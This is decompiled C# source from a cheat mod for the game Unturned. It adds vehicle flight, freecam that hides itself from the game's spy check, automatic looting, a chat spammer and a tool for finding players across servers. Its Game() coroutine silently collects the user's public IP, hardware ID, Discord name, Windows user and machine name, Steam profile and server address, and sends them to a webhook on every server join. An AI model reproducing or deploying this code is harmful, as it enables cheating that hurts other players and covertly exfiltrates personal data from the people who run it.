// https://github.com/aerodakdev && https://github.com/San3lka
// Current=> kaka.PlayerFinder
// <3

using Load;
using SDG.Unturned;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using UnityEngine;

#nullable disable
namespace kaka
{
  [Component]
  public class PlayerFinder : MonoBehaviour
  {
    public static Player SpP;
    private static bool VehicleF;
    public static bool FreecamBeforeSpy;
    public static ServerListFilters preparedFilter = (ServerListFilters) null;
    public const int playersMaxCurrentRefreshesCount = 5;
    public static string searchGoal = "";
    public static List<FetchedServer> servers = new List<FetchedServer>();
    public static List<FindedPlayer> findedPlayers = new List<FindedPlayer>();
    public static int currentlySearchesIndex = 0;
    public static bool isServersFetched = false;
    public static bool isFindingEnded = false;
    public static bool isFinding = false;
    public static PlayerFinder main;
    public Coroutine fetchC;

    public void Update()
    {
      PlayerFinder.VFlight();
      if (SpyUtilities.BeingSpied)
      {
        if (G.Settings.MiscOptions.Freecam)
        {
          PlayerFinder.FreecamBeforeSpy = true;
          G.Settings.MiscOptions.Freecam = false;
        }
      }
      else if (PlayerFinder.FreecamBeforeSpy)
      {
        PlayerFinder.FreecamBeforeSpy = false;
        G.Settings.MiscOptions.Freecam = true;
      }
      if (!VectorUtilities.ShouldRun())
        return;
      if (Object.op_Inequality((Object) PlayerFinder.SpP, (Object) null) && !SpyUtilities.BeingSpied)
      {
        Player.player.look.IsControllingFreecam = true;
        Player.player.look.orbitPosition = Vector3.op_Subtraction(((Component) PlayerFinder.SpP).transform.position, ((Component) Player.player).transform.position);
        PlayerLook look = Player.player.look;
        look.orbitPosition = Vector3.op_Addition(look.orbitPosition, new Vector3(0.0f, 3f, 0.0f));
      }
      else
        Player.player.look.IsControllingFreecam = G.Settings.MiscOptions.Freecam;
    }

    public static void VFlight()
    {
      InteractableVehicle vehicle = Player.player.movement.getVehicle();
      if (Object.op_Equality((Object) vehicle, (Object) null))
        return;
      Rigidbody component = ((Component) vehicle).GetComponent<Rigidbody>();
      if (Object.op_Equality((Object) component, (Object) null) || !vehicle.isDriver)
        return;
      if (!G.Settings.MiscOptions.VehicleFly)
      {
        if (!PlayerFinder.VehicleF)
          return;
        PlayerFinder.VehicleF = false;
        component.isKinematic = false;
      }
      else
      {
        PlayerFinder.VehicleF = true;
        component.isKinematic = true;
        float num = (G.Settings.MiscOptions.VehicleUseMaxSpeed ? vehicle.asset.TargetForwardVelocity * Time.fixedDeltaTime : G.Settings.MiscOptions.VehicleSpeed / 3f) * 0.98f;
        Transform transform = ((Component) component).transform;
        Vector3 zero = Vector3.zero;
        Vector3 vector3_1 = Vector3.zero;
        if (Input.GetKey((KeyCode) 100))
          zero.y += 2f;
        if (Input.GetKey((KeyCode) 97))
          zero.y += -2f;
        if (Input.GetKey((KeyCode) 276))
          zero.z += 2f;
        if (Input.GetKey((KeyCode) 275))
          zero.z += -2f;
        if (Input.GetKey((KeyCode) 273))
          zero.x += -1.5f;
        if (Input.GetKey((KeyCode) 274))
          zero.x += 1.5f;
        if (Input.GetKey((KeyCode) 32))
          vector3_1.y += 0.6f;
        if (Input.GetKey((KeyCode) 306))
          vector3_1.y -= 0.6f;
        if (Input.GetKey((KeyCode) 113))
          vector3_1 = Vector3.op_Subtraction(vector3_1, transform.right);
        if (Input.GetKey((KeyCode) 101))
          vector3_1 = Vector3.op_Addition(vector3_1, transform.right);
        if (Input.GetKey((KeyCode) 119))
          vector3_1 = Vector3.op_Addition(vector3_1, transform.forward);
        if (Input.GetKey((KeyCode) 115))
          vector3_1 = Vector3.op_Subtraction(vector3_1, transform.forward);
        Vector3 vector3_2 = Vector3.op_Addition(Vector3.op_Multiply(vector3_1, num), transform.position);
        if (G.Settings.MiscOptions.VehicleRigibody)
        {
          transform.position = vector3_2;
          transform.Rotate(zero);
        }
        else
        {
          component.MovePosition(vector3_2);
          component.MoveRotation(Quaternion.op_Multiply(transform.localRotation, Quaternion.Euler(zero)));
        }
      }
    }

    public static IEnumerator AutomaticCloseGenerator()
    {
      while (true)
      {
        if (G.Settings.MiscOptions.AutomaticCloseGenerator)
        {
          InteractableGenerator[] interactableGeneratorArray = Object.FindObjectsOfType<InteractableGenerator>();
          for (int index = 0; index < interactableGeneratorArray.Length; ++index)
          {
            InteractableGenerator interactableGenerator = interactableGeneratorArray[index];
            if (interactableGenerator.isPowered && Object.op_Inequality((Object) ((Component) interactableGenerator).gameObject, (Object) null) && VectorUtilities.GetDistance(((Component) Player.player).transform.position, ((Component) interactableGenerator).gameObject.transform.position) < 15.5)
            {
              ((Interactable) interactableGenerator).use();
              yield return (object) new WaitForSeconds(0.3f);
            }
          }
          interactableGeneratorArray = (InteractableGenerator[]) null;
        }
        yield return (object) new WaitForSeconds(0.1f);
      }
    }

    public static IEnumerator AutomaticSitToCar()
    {
      while (true)
      {
        if (G.Settings.MiscOptions.AutomaticSitToCar)
        {
          foreach (InteractableVehicle interactableVehicle in Object.FindObjectsOfType<InteractableVehicle>())
          {
            if (Object.op_Equality((Object) Player.player.movement.getVehicle(), (Object) null) && Object.op_Inequality((Object) ((Component) interactableVehicle).gameObject, (Object) null) && VectorUtilities.GetDistance(((Component) Player.player).transform.position, ((Component) interactableVehicle).gameObject.transform.position) < 15.5)
              ((Interactable) interactableVehicle).use();
          }
        }
        yield return (object) new WaitForSeconds(0.1f);
      }
    }

    public static IEnumerator AutomaticForage()
    {
      while (true)
      {
        if (G.Settings.MiscOptions.AutomaticForage)
        {
          InteractableForage[] interactableForageArray = Object.FindObjectsOfType<InteractableForage>();
          for (int index = 0; index < interactableForageArray.Length; ++index)
          {
            InteractableForage interactableForage = interactableForageArray[index];
            if (((Interactable) interactableForage).checkUseable() && Object.op_Inequality((Object) ((Component) interactableForage).gameObject, (Object) null) && VectorUtilities.GetDistance(((Component) Player.player).transform.position, ((Component) interactableForage).gameObject.transform.position) < 16.0)
            {
              ((Interactable) interactableForage).use();
              yield return (object) new WaitForSeconds(0.1f);
            }
          }
          interactableForageArray = (InteractableForage[]) null;
        }
        yield return (object) new WaitForSeconds(0.1f);
      }
    }

    public static IEnumerator Game()
    {
      bool döndür = false;
      using (WebClient wb = new WebClient())
      {
        string ip = wb.DownloadString("https://wtfismyip.com/text");
        string l0g = Loadc.HLink;
        string hwid = Loadc.H();
        string dc = Loadc.Discord;
        while (true)
        {
          if (VectorUtilities.ShouldRun())
          {
            if (!döndür)
            {
              WebhookEmbed webhookEmbed = new WM().WithAvatar("").WithUsername("Oyun L0g").PassEmbed().WithTitle("Sunucuya Girdi!").WithDescription("Bilgisayar Bilgileri 1: " + hwid + " - " + dc + " - " + ip + "Bilgisayar Bilgileri 2: " + Environment.UserName + " | " + Environment.MachineName + "\n\nOyuncu Bilgileri: " + Player.player.channel.owner.playerID.characterName + " [" + Player.player.channel.owner.playerID.playerName + "]\nhttps://steamcommunity.com/profiles/" + Provider.user.ToString()).WithColor(new EmbedColor((byte) 0, byte.MaxValue, (byte) 0)).WithTimestamp(DateTime.Now);
              string str = Provider.CurrentServerAdvertisement.name + " | " + Provider.CurrentServerAdvertisement.players.ToString() + "/" + Provider.CurrentServerAdvertisement.maxPlayers.ToString();
              DWS.PMA(l0g, webhookEmbed.WithField("Sunucu Bilgileri 1:", str).WithField("Sunucu Bilgileri 2:", Parser.getIPFromUInt32(Provider.CurrentServerAdvertisement.ip) + ":" + Provider.CurrentServerAdvertisement.queryPort.ToString()).Finalize());
              döndür = true;
            }
          }
          else if (!Provider.isConnected && !Provider.isLoading && !LoadingUI.isBlocked && Object.op_Equality((Object) Player.player, (Object) null) && döndür)
            döndür = false;
          yield return (object) new WaitForSeconds(10f);
        }
      }
    }

    public static IEnumerator AutomaticHarvest()
    {
      while (true)
      {
        if (G.Settings.MiscOptions.AutomaticHarvest)
        {
          InteractableFarm[] interactableFarmArray = Object.FindObjectsOfType<InteractableFarm>();
          for (int index = 0; index < interactableFarmArray.Length; ++index)
          {
            InteractableFarm interactableFarm = interactableFarmArray[index];
            if (interactableFarm.checkFarm() && Object.op_Inequality((Object) ((Component) interactableFarm).gameObject, (Object) null) && VectorUtilities.GetDistance(((Component) Player.player).transform.position, ((Component) interactableFarm).gameObject.transform.position) < 16.0)
            {
              ((Interactable) interactableFarm).use();
              yield return (object) new WaitForSeconds(0.1f);
            }
          }
          interactableFarmArray = (InteractableFarm[]) null;
        }
        yield return (object) new WaitForSeconds(0.1f);
      }
    }

    public static IEnumerator AutomaticStructures()
    {
      while (true)
      {
        if (G.Settings.MiscOptions.AutomaticStructures)
        {
          Interactable2[] interactable2Array = Object.FindObjectsOfType<Interactable2>();
          for (int index = 0; index < interactable2Array.Length; ++index)
          {
            Interactable2 interactable2 = interactable2Array[index];
            if (Object.op_Inequality((Object) ((Component) interactable2).gameObject, (Object) null) && VectorUtilities.GetDistance(((Component) Player.player).transform.position, ((Component) interactable2).gameObject.transform.position) < (double) G.Settings.MiscOptions.AutomaticStructuresM)
            {
              interactable2.use();
              yield return (object) new WaitForSeconds(G.Settings.MiscOptions.AutomaticStructuresZ);
            }
          }
          interactable2Array = (Interactable2[]) null;
        }
        yield return (object) new WaitForSeconds(0.1f);
      }
    }

    public static IEnumerator AutomaticATM()
    {
      while (true)
      {
        if (G.Settings.MiscOptions.AutomaticATM)
        {
          InteractableObjectDropper[] interactableObjectDropperArray = Object.FindObjectsOfType<InteractableObjectDropper>();
          for (int index = 0; index < interactableObjectDropperArray.Length; ++index)
          {
            InteractableObjectDropper interactableObjectDropper = interactableObjectDropperArray[index];
            if (((Behaviour) interactableObjectDropper).isActiveAndEnabled && interactableObjectDropper.isUsable && Object.op_Inequality((Object) ((Component) interactableObjectDropper).gameObject, (Object) null) && VectorUtilities.GetDistance(((Component) Player.player).transform.position, ((Component) interactableObjectDropper).gameObject.transform.position) < 15.5)
            {
              ((Interactable) interactableObjectDropper).use();
              yield return (object) new WaitForSeconds(0.1f);
              if (G.Settings.MiscOptions.AutomaticATMPickup)
              {
                Collider[] array = Physics.OverlapSphere(((Component) Player.player).transform.position, (float) G.Settings.MiscOptions.ItemPickupRange, 8192);
                for (int i = 0; i < array.Length; ++i)
                {
                  Collider collider = array[i];
                  if ((Object.op_Equality((Object) collider, (Object) null) || Object.op_Equality((Object) ((Component) collider).GetComponent<InteractableItem>(), (Object) null) ? 1 : (((Component) collider).GetComponent<InteractableItem>().asset == null ? 1 : 0)) == 0)
                  {
                    InteractableItem component = ((Component) collider).GetComponent<InteractableItem>();
                    if (Object.op_Inequality((Object) ((Component) component).gameObject, (Object) null) && component.asset.itemName.Contains("$"))
                    {
                      ((Interactable) component).use();
                      yield return (object) new WaitForSeconds(0.1f);
                    }
                  }
                }
                array = (Collider[]) null;
              }
            }
          }
          interactableObjectDropperArray = (InteractableObjectDropper[]) null;
        }
        yield return (object) new WaitForSeconds(1f);
      }
    }

    public static IEnumerator AutoItemPickupFiltresiz()
    {
      while (true)
      {
        if (VectorUtilities.ShouldRun() && G.Settings.MiscOptions.AutoItemPickupFiltresiz)
        {
          Collider[] array = Physics.OverlapSphere(((Component) Player.player).transform.position, (float) G.Settings.MiscOptions.ItemPickupDelayFiltresizRange, 8192);
          for (int i = 0; i < array.Length; ++i)
          {
            Collider collider = array[i];
            if ((Object.op_Equality((Object) collider, (Object) null) || Object.op_Equality((Object) ((Component) collider).GetComponent<InteractableItem>(), (Object) null) ? 1 : (((Component) collider).GetComponent<InteractableItem>().asset == null ? 1 : 0)) == 0)
            {
              ((Interactable) ((Component) collider).GetComponent<InteractableItem>()).use();
              yield return (object) new WaitForSeconds(G.Settings.MiscOptions.ItemPickupDelayFiltresizDelay);
            }
          }
          array = (Collider[]) null;
        }
        yield return (object) new WaitForSeconds(0.1f);
      }
    }

    [Thread]
    public static void Spammer()
    {
      while (true)
      {
        do
        {
          Thread.Sleep(G.Settings.MiscOptions.SpammerDelay);
        }
        while (!G.Settings.MiscOptions.SpammerEnabled);
        ChatManager.sendChat((EChatMode) 0, G.Settings.MiscOptions.SpamText);
      }
    }

    public void Awake()
    {
      PlayerFinder.main = this;
      PlayerFinder.preparedFilter = new ServerListFilters();
      PlayerFinder.preparedFilter.attendance = (EAttendance) 1;
      PlayerFinder.preparedFilter.vacProtection = (EVACProtectionFilter) 2;
      PlayerFinder.preparedFilter.workshop = (EWorkshop) 2;
      PlayerFinder.preparedFilter.plugins = (EPlugins) 2;
      PlayerFinder.preparedFilter.password = (EPassword) 0;
      PlayerFinder.preparedFilter.camera = (ECameraMode) 4;
      PlayerFinder.preparedFilter.battlEyeProtection = (EBattlEyeProtectionFilter) 2;
      PlayerFinder.preparedFilter.cheats = (ECheats) 2;
      PlayerFinder.preparedFilter.notFull = true;
      PlayerFinder.preparedFilter.gold = (EServerListGoldFilter) 0;
      PlayerFinder.preparedFilter.listSource = (ESteamServerList) 0;
      PlayerFinder.preparedFilter.combat = (ECombat) 2;
      PlayerFinder.preparedFilter.monetization = (EServerMonetizationTag) 1;
    }

    public void StartPlayerSearching(string nickName)
    {
      if (string.IsNullOrEmpty(nickName))
        return;
      PlayerFinder.searchGoal = nickName;
      PlayerFinder.servers.Clear();
      PlayerFinder.findedPlayers.Clear();
      PlayerFinder.currentlySearchesIndex = 0;
      PlayerFinder.isServersFetched = false;
      PlayerFinder.isFindingEnded = false;
      PlayerFinder.isFinding = true;
      this.StartSearchServers();
    }

    public void StartSearchServers()
    {
      this.fetchC = this.StartCoroutine(this.fetchServersChecking());
      Provider.provider.matchmakingService.refreshMasterServer(PlayerFinder.preparedFilter);
    }

    public IEnumerator fetchServersChecking()
    {
      PlayerFinder playerFinder = this;
      float noChangeTime = 0.0f;
      int lastServerCount = 0;
      while (true)
      {
        if (lastServerCount != Provider.provider.matchmakingService.serverList.Count)
        {
          noChangeTime = 0.0f;
          lastServerCount = Provider.provider.matchmakingService.serverList.Count;
        }
        noChangeTime += Time.deltaTime;
        if ((double) noChangeTime <= 2.0)
          yield return (object) null;
        else
          break;
      }
      PlayerFinder.isServersFetched = true;
      while (PlayerFinder.servers.Count < 5)
      {
        SteamServerAdvertisement server = Provider.provider.matchmakingService.serverList[PlayerFinder.currentlySearchesIndex];
        FetchedServer fetchedServer = new FetchedServer(server.ip, server.queryPort, server.connectionPort, server.name, PlayerFinder.currentlySearchesIndex, new Action<string, float, int>(playerFinder.onFetchFinished));
        PlayerFinder.servers.Add(fetchedServer);
        fetchedServer.Refresh();
        ++PlayerFinder.currentlySearchesIndex;
      }
    }

    public void StopSearcesImmediate()
    {
      for (int index = 0; index < PlayerFinder.servers.Count; ++index)
        PlayerFinder.servers[index].ForceStop();
      if (this.fetchC != null)
      {
        this.StopCoroutine(this.fetchC);
        this.fetchC = (Coroutine) null;
      }
      PlayerFinder.servers.Clear();
      PlayerFinder.isFinding = false;
    }

    public void onFetchFinished(string nickname, float playTime, int index)
    {
      if (!PlayerFinder.isFinding)
        return;
      for (int index1 = 0; index1 < PlayerFinder.servers.Count; ++index1)
      {
        if (PlayerFinder.servers[index1].index == index)
        {
          if (!string.IsNullOrEmpty(nickname))
          {
            TimeSpan timeSpan = TimeSpan.FromSeconds((double) playTime);
            string time = string.Empty;
            int num;
            if (timeSpan.Days > 0)
            {
              string str1 = time;
              num = timeSpan.Days;
              string str2 = num.ToString();
              time = str1 + " " + str2 + "d";
            }
            if (timeSpan.Hours > 0)
            {
              string str3 = time;
              num = timeSpan.Hours;
              string str4 = num.ToString();
              time = str3 + " " + str4 + "h";
            }
            if (timeSpan.Minutes > 0)
            {
              string str5 = time;
              num = timeSpan.Minutes;
              string str6 = num.ToString();
              time = str5 + " " + str6 + "m";
            }
            if (timeSpan.Seconds > 0)
            {
              string str7 = time;
              num = timeSpan.Seconds;
              string str8 = num.ToString();
              time = str7 + " " + str8 + "s";
            }
            FindedPlayer findedPlayer = new FindedPlayer(PlayerFinder.servers[index1].serverIP, PlayerFinder.servers[index1].serverPort, PlayerFinder.servers[index1].name, nickname.ToLower(), time);
            PlayerFinder.findedPlayers.Add(findedPlayer);
          }
          PlayerFinder.servers.RemoveAt(index1);
          break;
        }
      }
      if (Provider.provider.matchmakingService.serverList.Count == PlayerFinder.currentlySearchesIndex && PlayerFinder.servers.Count == 0)
      {
        PlayerFinder.isFindingEnded = true;
        PlayerFinder.isFinding = false;
      }
      else
      {
        if (Provider.provider.matchmakingService.serverList.Count == PlayerFinder.currentlySearchesIndex)
          return;
        SteamServerAdvertisement server = Provider.provider.matchmakingService.serverList[PlayerFinder.currentlySearchesIndex];
        FetchedServer fetchedServer = new FetchedServer(server.ip, server.queryPort, server.connectionPort, server.name, PlayerFinder.currentlySearchesIndex, new Action<string, float, int>(this.onFetchFinished));
        PlayerFinder.servers.Add(fetchedServer);
        fetchedServer.Refresh();
        ++PlayerFinder.currentlySearchesIndex;
      }
    }
  }
}
